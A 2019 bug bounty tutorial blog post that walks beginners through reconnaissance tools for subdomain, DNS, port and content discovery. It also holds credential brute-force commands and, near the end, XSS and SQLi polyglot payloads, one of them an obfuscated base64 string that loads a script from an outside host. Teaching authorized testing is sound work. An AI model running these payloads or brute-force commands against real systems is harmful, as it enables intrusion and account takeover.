---
title: "Bug Hunting Tips"
date: "2019-02-07"
categories: 
  - "bug-hunting"
---

Author: Shankar

**Pre-requisites Skills:**

_Linux basics_

[_Basic idea about the HTTP protocols and its headers(Request and Response)_](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)

[_(Burpsuite)_](https://portswigger.net/burp/communitydownload)

**How to choose our target ?**

We can choose our targets from bug bounty platforms like [**Bugcrowd**](https://www.bugcrowd.com/)**,** [**Hackerone**](https://www.hackerone.com/)**,** [**Zerocopter**](https://www.zerocopter.com/), etc,

Or we can find targets from the google by searching for **responsible disclosure policy** of a website.

**We have a target then how to start ??**

If you have chosen your target. then you should start finding the subdomain of the target.

or we can start with the IP blocks of the targets which we can get from the ASN (some of the websites are mentioned in below)

**Why we need subdomain?**

Sometimes targeting the main domain is not possible to find bugs which will frustrated to the noobs. Because the top or other researchers are already found and reported the bugs to the target. For newbie should start with the other subdomains.

**How to find Subdomains?**

As per my recon I am using the following tools to find the subdomains for the target. (Commands are given below)

[Subfinder](https://github.com/subfinder/subfinder)

[Amass](https://github.com/caffix/amass)

[Sublist3r](https://github.com/aboul3la/Sublist3r)

[Aquatone](https://github.com/michenriksen/aquatone)

[Knockpy](https://github.com/guelfoweb/knock)

In other words we can find subdomains using certificate transparency methodology

From [crt.sh](https://crt.sh/?q=%25.paypal.com), [censys.io](https://censys.io/),[shodan.io](https://www.shodan.io/), google certificate transparency, facebook certificate transparency, and even CSP header etc.

For more info: [https://www.youtube.com/watch?v=McLdm4c1oLs&list=PLIK9nm3mu-S6gCKmlC5CDFhWvbEX9fNW6&index=4](https://www.youtube.com/watch?v=McLdm4c1oLs&list=PLIK9nm3mu-S6gCKmlC5CDFhWvbEX9fNW6&index=4)

**Subdomain Takeover Vulnerability:**

In the community have already publish lots of writeups for subdomain takeover vulnerability So let me skip this part. If anybody needs this then let me know.

[https://github.com/EdOverflow/can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz)

**Discovering Target Using ASN (IP Blocks):**  
+++++++++++++++++++++++  
[http://bgp.he.net](http://bgp.he.net)

[https://whois.arin.net/ui/query.do](https://whois.arin.net/ui/query.do)

[https://apps.db.ripe.net/db-web-ui/#/fulltextsearch](https://apps.db.ripe.net/db-web-ui/#/fulltextsearch)

[https://reverse.report/](https://reverse.report/)

[https://www.shodan.io/search?query=org%3A%22Tesla+Motors%22](https://www.shodan.io/search?query=org%3A%22Tesla+Motors%22)

\========================================

**IP Range Finder Script: by sreeram KL (1337 method)**  
 — — — — — — — — — — — — — — — — — — — — — — — —

**whois -h whois.radb.net — ‘-i origin AS45566’ | grep -Eo “(\[0–9.\]+){4}/\[0–9\]+” | head**

\========================================

**Brand / TLD Discovery:**  
 — — — — — — — — — —

This will increase the target scope by searching for a Aquiasition of a target

Aquiasition — -> [**crunchbase**](https://www.crunchbase.com/search/acquisitions), wikipedia

link discovery — ->burp spidering

weighted& reverse tracker → domlink, builtwith

**DomLink**  
 — — — — — —   
python domlink.py -d google.com -o google.out.txt

\========================================

Trademark In Google: ” “Tesla © 2016” “Tesla © 2015” “Tesla © 2017” inurl:tesla

\========================================  
**Discovering New Targets**  
(Subdomains)  
+++++++++++++++

**Amass**  
 — — — — —   
amass -json out.json -d example.com

\========================================  
**Subfinder**   
 — — — — — —

./subfinder -d example.com -o ./output.txt oT

or

docker run -v $HOME/.config/subfinder:/root/.config/subfinder -it subfinder -d example.com -o output.txt -nw -oA > uber.com.txt

\========================================  
**Gobuster**  
 — — — — —  
time gobuster -m dns -u $TARGET.com -t 100 -w all.txt

time ./subbrute.py /root/work/bin/all.txt $TARGET.com | ./bin/massdns -r resolvers.txt -t A -a -o -w massdns\_output.txt - 
\========================================

**Aquatone**  
 — — — — — — —   
aquatone-discover — domain example.com — threads 25

aquatone-scan — domain example.com — ports huge -t 30

aquatone-gather — domain example.com — threads 25

\========================================

**Subdomain Enumberation**  
 — — — — — — — — — — — — — — — — — — — — —

These techniques are given by the awesome man [Bharath](https://twitter.com/0xbharath)

Here you can find the original scripts [https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration](https://github.com/appsecco/bugcrowd-levelup-subdomain-enumeration)

**Note: Kindly replace the API key used inside the scripts which may be an invalid which results in less amount of subdomains**

#### Presentation:

Slides are available at: [https://speakerdeck.com/yamakira/esoteric-sub-domain-enumeration-techniques](https://speakerdeck.com/yamakira/esoteric-sub-domain-enumeration-techniques)

#### Video

Video is available at: [https://youtu.be/e\_Gq99CKAys](https://youtu.be/e_Gq99CKAys)

**Subdomain Enumeration with the SPF record**

python assets\_from\_SPF.py google.com  
\========================================

**Using Censys**  
 — — — — — — — — — —   
 python censys\_enumeration.py domain.txt  
\========================================

**Using CSP**  
 — — — — — — — — — —   
 python csp\_parser.py google.com -r

\========================================

**Rapid 7 Forward DNS dataset**  
 — — — — — — — — — — — — — — — —

curl -silent [https://scans.io/data/rapid7/sonar.fdns\_v2/20170417-fdns.json.gz](https://scans.io/data/rapid7/sonar.fdns_v2/20170417-fdns.json.gz) | pigz -dc | grep “.icann.org” | jq

\========================================  
**DNSrecon**  
 — — — — — —   
python dnsrecon.py -n ns1.insecuredns.com -d insecuredns.com -D subdomains-top1mil-5000.txt -t brt

\========================================  
**ALTDNS**  
 — — — — — —   
python altdns.py -i icann.domains -o data\_output -w icann.words -r -s results\_output.txt

\========================================

**Zone transfer using dig**  
 — — — — — — — — — — —

dig +multi AXFR [@ns1](http://twitter.com/ns1).insecuredns.com insecuredns.com  
\========================================  
**DNSSEC**  
 — — — — — — — — —   
dig +multi +dnssec A paypal.com

dig +dnssec [@ns1](http://twitter.com/ns1).insecuredns.com firewall.insecuredns.com  
\========================================  
**Zone walking NSEC — LDNS**  
 — — — — — — — — — — — — —   
$ ldns-walk [@name\_server](http://twitter.com/name_server) domain\_name  
\========================================

**Zone walking NSEC — Dig**  
 — — — — — — — — — — — —   
 You can list all the sub-domains by following the linked list of NSEC records of existing domains.

$ dig +short NSEC api.nasa.gov

$ dig +short NSEC apm.nasa.gov

\========================================  
**Extracting the sub-domain from NSEC**  
 — — — — — — — — — — — — — — — — — —

dig +short NSEC api.nasa.gov | awk ‘{print $1;}’  
apm.nasa.gov.  
\========================================

**Zone walking NSEC3**  
 — — — — — — — — — — —   
Zone walking NSEC3 protected zone using nsec3walker:

\# Collect NSEC3 hashes of a domain  
$ ./collect insecuredns.com > insecuredns.com.collect

\# Undo the hashing, expose the sub-domain information.  
$ ./unhash < insecuredns.com.collect > insecuredns.com.unhash

\========================================

**Zone walking NSEC**3  
 — — — — — — — — — —   
\# Checking the number of sucessfully cracked sub-domain hashes  
$ cat icann.org.unhash | grep “icann” | wc -l  
45

\# Listing only the sub-domain part from the unhashed data  
$ cat icann.org.unhash | grep “icann” | awk ‘{print $2;}’

\========================================

dig +short TXT icann.org | grep spf

\========================================

**MASSDNS**

./bin/massdns -r resolvers.txt -t AAAA -w results.txt domains.txt

\========================================

**Port Scanning:**

The port scanning is very important to find the running in unfamiliar or standard ports the target.

For port scanning I have used **NMAP** and **Masscan** and **Aquatone scan**.

Then some researcher start checking for subdomain takeover vulnerability once they found subdomains which running on the usual or usual ports.

**Enumerating Targets(Port Scanning)**  
++++++++++++++++++++

**Masscan**  
 — — — — —

masscan -p1–65535 -iL $TARGET\_LIST — max-rate 10000 -oG $TARGET\_OUTPUT

\========================================

**NMAP**  
 — — — —

nmap -S 192.168.0.1 -d — max-scan-delay 10 -oA logs/tcp-allports-%T-%D -iL tcp-allports-1M-ips — max-retries 1 — randomize-hosts -p- -PS21,22,23,25,53,80,443 -T4 — min-hostgroup 256

\========================================

**Visual Identification**  
+++++++++++++++

This part will help us to find a application which is running on standard or non-standard ports on the target machine.

The following tools are grabbing banner if they found on the target machine which is running on specific ports. That will help us to sort list our target subdomains.

**Eyewitness**  
 — — — — — —  
eyewitness -f urls.txt — web

\========================================

**Wayback Enumeration →> waybackurl**  
+++++++++++++++++++++++

This technology will help us if we seen any one of the http responses like 401,403,404. This will show you the old stored data using Archive.

Here we can find some sensitive information even the target page is not currently accessible.  
https://archieve.org/web

**ReconCat**  
 — — — — — — —

php recon -y2012 — url=[https://github.com](https://github.com) -t10 (fetch snapshot of year 2012 of github with 10 threads)

\========================================  
**waybackurls**  
 — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — - 
python waybackurls.py — help

\========================================  
**waybackunifier**  
 — — — — — —  
./waybackunifier — help  
\========================================

**Parsing JavaScript**  
++++++++++++

Parsing JS is very useful to find the directories which is used by the target. we can use these type of tools instead of brute-forcing the directory list on the target

Note: Brute-Forcing of directory also good thing to do. Always use the multiple techniques to find the directory from the targets

**Jsparser**  
 — — — — — — — —

Run handler.py and then visit [http://localhost:8008](http://localhost:8008).  
\========================================  
**linkfinder**  
 — — — — — —   
python linkfinder.py -i [https://example.com](https://example.com) -d /\* Will analyze the entire domain’s JS files \*/

python linkfinder.py -i [https://example.com/1.js](https://example.com/1.js) -o results.html

\========================================  
**DIRsearch**  
 — — — — — —

python3 dirsearch.py — help  
\========================================

**Dirb:**

dirb [https://target.com/](https://target.com/)

And Use DirBuster Also

**Content Discovery**  
++++++++++++  
Gobuster   
Burp content discovery  
Robots disallowed

\========================================  
**_Seclists / RAFT / Digger word-lists will help us to find the word-lists for appropriate attacks_**  
++++++++++++++++++++++++++++++++++++++++

**Parameter Bruting?**  
+++++++++++

Parameter brute-forcing will helpful to find the vulnerabilities. Becoz there is no protection on those parameters compared to the usual one. You should try this methods once.  
**parameth**  
 — — — — — —

parameth.py -u example.com/login.php -t 30 -o output.txt

\========================================

**credential bruteforce**  
++++++++++++

These tools are having the ability to brute-force the different type of protocols like http, ssh,smtp, etc

**Brutespray**  
python brutespray.py — file nmap.gnmap -U /usr/share/wordlist/user.txt -P /usr/share/wordlist/pass.txt — threads 5 — hosts 5

\========================================  
**MEDUSA**  
 — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —   
medusa -h 192.168.1.1 -u “admin” -P c:/file/directory/hugewordlist.txt -M http

\========================================

**Technology Identification and Vulnerability findings:**

Here I used **Wappalyzer** and **build with** add-ons on the browsers. [**Whatweb**](https://tools.kali.org/web-applications/whatweb) tool also I used to find the what technologies they used on the target.

The following tools to find technologies and technology based vulnerabilities on the target

**WPScan**  
 — — — —

wpscan — url [www.example.com](http://www.example.com)

\========================================  
**cmsmap**  
 — — — — — —   
 cmsmap.py -t [https://example.com](https://example.com) -o output.txt  
   
 cmsmap.py -t [https://example.com](https://example.com) -u admin -p passwords.txt  
   
 cmsmap.py -k hashes.txt -w passwords.txt

\========================================

**Github Recon to find juicy information about the target**  
++++++++++++++++++++++++++++++

We can use github to find sensitive information like RSA key,API Key, Source-code with the default credentials and the databases etc. The following tools will reduce the analysis time. but the manual finding is always good.

**Gitrob**

./gitrob google

To see the result go to browser and type localhost:9393  
\========================================

**Trufflehog**  
++++++++++

trufflehog [https://github.com/SeppPenner/postgres.git](https://github.com/SeppPenner/postgres.git)

\========================================

**Git Repo DORKS**   
 — — — — — — — —  
[https://github.com/techgaun/github-dorks](https://github.com/techgaun/github-dorks)

[https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt](https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt)

\========================================

**How to start testing for a bug ??**

The testing is based on our opinion. some of them start with the xss and other vulnerabilities which we can easily found from the target.

Still you are stuck with the testing for a bug means you can start reading the following books which always helpful for Bug hunter or Application Penetration Tester.

1,[https://www.amazon.in/Web-Application-Hackers-Handbook-Exploiting/dp/8126533404](https://www.amazon.in/Web-Application-Hackers-Handbook-Exploiting/dp/8126533404)

2,[https://www.owasp.org/index.php/OWASP\_Testing\_Guide\_v4\_Table\_of\_Contents](https://www.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents)

3,[https://leanpub.com/web-hacking-101](https://leanpub.com/web-hacking-101)

I hope these books are very helpful for how to test for a bugs

**Polyglot paylots:**

**XSS**  
 — — —

%3C!%27/\*!%22/\*!\\%27/\*\\%22/\* — !%3E%3C/Title/%3C/script/%3E%3CInput%20Type=Text%20Style=position:fixed;top:0;left:0;font-size:999px%20\*/;%20Onmouseenter=confirm\`1\`%20//%3E#

<!’/\*!”/\*!\\’/\*\\”/\* — !></Title/</script/><Input Type=Text Style=position:fixed;top:0;left:0;font-size:999px \*/; Onmouseenter=confirm\`1\` //>#

jaVasCript:/\*-/\*\`/\*\\\`/\*’/\*”/\*\*/(/\* \*/oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/ — !>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e

“>><marquee><img src=x onerror=confirm(1)></marquee>” ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>[@gmail](http://twitter.com/gmail).com<isindex formaction=javascript:alert(/XSS/) type=submit>’ →” >  
“></script><script>alert(1)</script>”><img/id=”confirm&lpar; 1)”/alt=”/”src=”/”onerror=eval(id&%23x29;>’”>”><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYnhzcy54c3MuaHQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>

“ onclick=alert(1)//<button ‘ onclick=alert(1)//> \*/ alert(1)//

‘;alert(String.fromCharCode(88,83,83))//’;alert(String. fromCharCode(88,83,83))//”;alert(String.fromCharCode (88,83,83))//”;alert(String.fromCharCode(88,83,83))// →</SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>  
\========================================

**SQLi Polyglot:**  
 — — — — — — — — —

SLEEP(1) /\*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “\*/

‘%2Bbenchmark(3200,SHA1(1))%2B’

‘+BENCHMARK(40000000,SHA1(1337))+’

\========================================

**SSTI (Server Side Template Injection)**  
++++++++++++++++++++++++

**TPLMap  
 — — — —** — — — —

./tplmap.py -u ‘[http://www.target.com/page?name=John'](http://www.target.com/page?name=John%27)

\========================================

Special Thanks to:

[Rahul Raj](https://www.facebook.com/rahulr4j),[Velayutham Selvaraj](https://www.facebook.com/lawway09),[havoc Guhan](https://www.facebook.com/havocgwen), [Sreeram KL](https://www.facebook.com/sreeram.kl)(This guy is awesome and one of my favorite & emerging hunter),[Kishore T K](https://www.facebook.com/kishorethouguluvakumaran),[Sai Naik](https://www.facebook.com/hackerone.net),[Ali Razzaq](https://www.facebook.com/alirazzaqlive), [M Khizer Javed](https://www.facebook.com/MuhammadKhizerJaved33), [Vishnu Prasad](https://www.facebook.com/vishnuprasadnta), Pethu Raj,phwd, Jason Haddix, Frans Rosen, Mathias, Zseano,,[James Kettle](https://twitter.com/albinowax),Filedescriptor, Stok etc.

I always thank to every mates for providing their finding to the community.

**Reference** and I started with this following videos and I suggested to watch noobs to understand what is going on in Bug Hunting :

XSS:

https://www.youtube.com/watch?v=LLtOJNeMp7c

https://www.youtube.com/watch?v=TKn5qdti66c

https://www.youtube.com/watch?v=lXn1nU01ufI

https://www.youtube.com/watch?v=dWLpw-7\_pa8

Oauth:

https://youtu.be/X0mV9HXbKHY

Bug bounty Tips:

https://www.youtube.com/watch?list=PLIK9nm3mu-S6gCKmlC5CDFhWvbEX9fNW6&v=Qw1nNPiH\_Go

https://www.youtube.com/watch?v=BEaMhs9LmoY

https://www.youtube.com/watch?v=1Kg0\_53ZEq8

**Miscellaneous**

https://www.youtube.com/watch?v=KDo68Laayh8

Good writeups:

[https://github.com/ngalongc/bug-bounty-reference](https://github.com/ngalongc/bug-bounty-reference)  
[https://pentester.land/list-of-bug-bounty-writeups.html](https://pentester.land/list-of-bug-bounty-writeups.html)  
[https://hackerone.com/hacktivity?sort\_type=popular&filter=type%3Aall&querystring=&page=1](https://hackerone.com/hacktivity?sort_type=popular&filter=type%3Aall&querystring=&page=1)
